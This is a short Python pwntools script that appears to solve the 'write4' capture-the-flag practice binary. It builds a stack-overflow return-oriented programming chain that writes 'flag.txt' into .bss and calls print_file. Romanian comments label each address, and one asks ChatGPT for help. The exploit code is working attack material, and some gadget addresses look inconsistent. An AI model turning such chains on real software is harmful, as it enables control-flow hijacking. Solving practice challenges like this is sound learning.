from pwn import *

p = process("./write4")

payload = b"A" * 40

payload += p64(0x400690) # Adresa gadget-ului
payload += p64(0x00601038) # Adresa lui '.bss' (pentru ca este -rw-) pe care o sa o pun in r14
payload += p64(0x7478742e67616c66) # <- Aici vreau sa pun valoarea "flag.txt", dar nu stiu cum ajutor aici ChatGpt

payload += p64(0x400628) # Adresa lui usefulGadgets
payload += p64(0x400693) # Adresa lui "pop rdi ; ret"
payload += p64(0x00601038) # Adresa lui '.bss' (pentru ca este -rw-) pe care o sa o pun in r14
payload += p64(0x400620) # Adresa lui "print_file"

with open("input.txt", "wb") as f:
    f.write(payload)

p.recvuntil(b">")
p.sendline(payload)

p.interactive()